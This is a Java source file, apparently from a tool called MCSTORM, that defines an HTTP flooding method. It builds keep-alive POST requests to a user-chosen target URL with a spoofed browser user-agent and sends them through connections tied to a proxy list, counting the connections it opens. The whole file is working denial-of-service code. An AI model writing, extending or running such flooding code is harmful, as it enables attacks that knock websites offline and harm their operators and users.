package io.MCSTORM.methods;

import io.MCSTORM.Main;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.handler.codec.http.*;

import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class HTTP implements Method{
    private final String content;
    private final Map<String,String> headers = new HashMap<>();

    public HTTP() {
        String content1;
        content1 = "";
        for (int i = '\uffff';i > 60000;i--) {
            content1 +=(char) i;
        }
        content = content1;

        headers.put("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
        headers.put("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203");
    }

    @Override
    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        try {
            HttpRequest request = buildRequest(content, Main.cusIp,true,headers);
            channel.writeAndFlush(request);
            NettyBootstrap.integer++;
            NettyBootstrap.totalConnections++;
        } catch (Exception ignored) {
            ;
        }
    }

    public  HttpRequest buildRequest(String msg, String url, boolean isKeepAlive, Map<String,String> headers) throws Exception {
        URL netUrl = new URL(url);
        URI uri = new URI(netUrl.getPath());
        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1,
                HttpMethod.POST,
                uri.toASCIIString()
               // , Unpooled.wrappedBuffer(msg.getBytes(StandardCharsets.UTF_8))
                );

        request.headers().set(HttpHeaderNames.HOST, netUrl.getHost());
        if (headers != null && !headers.isEmpty()) {
            for (Map.Entry<String, String> entry : headers.entrySet()) {
                request.headers().set(entry.getKey(), entry.getValue());
            }
        }

       // request.headers().set(HttpHeaderNames.CONTENT_TYPE , "text/json;charset=UTF-8");
       // request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());
        if (isKeepAlive){
            request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);
        }

        return request;
    }
}
